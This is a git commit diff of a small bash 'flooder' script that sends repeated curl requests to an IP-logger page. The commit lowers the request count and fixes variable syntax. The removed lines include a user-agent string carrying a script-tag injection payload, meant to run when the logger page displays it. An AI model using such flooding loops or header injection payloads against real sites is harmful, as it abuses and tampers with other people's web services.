1c021bf672773c98d757629e82366b02b4f20b26
SossenSystems <33610430+SossenSystems@users.noreply.github.com>
2018-02-25 23:47:39 +0100

    Update flood.sh

--- flood.sh
+++ flood.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-count=200; #Spam counter!
+count=2; #Spam counter!
 url="http://example.com/iplogger.php" #The logger page can be entered here.
-user-agent="IP-Logger/3.0.1 (Flood; HackOS; Linux x86_64; rv:52.4) <b>Flood $((i))!</b> <script>alert('Do not log my IP address!!');</script>" #The user agent can be defined here
+useragent="Flooding-Tool/3.0.1 (GitHub.com/SossenSystems/Simple-cURL-Flooder; HackOS; Lindows x86_64; rv:52.4)" #The user agent can be defined here
 RED='\033[0;31m'
 GREEN='\e[32m'
 NC='\033[0m'
@@ -17,7 +17,7 @@ if [[ $1 == 'start' ]]; then
 	else
 		printf "${RED}Start flooding...${NC}\n"
 		for ((i=0; i < count; i++)) ; do
-			curl --silent --output /dev/null -A $((user-agent)) $((url)) > /dev/null
+			curl --silent --output /dev/null -A "$useragent" $url > /dev/null
 		done
 		printf "${GREEN}Flooding has been finished!${NC}\n"
 	fi
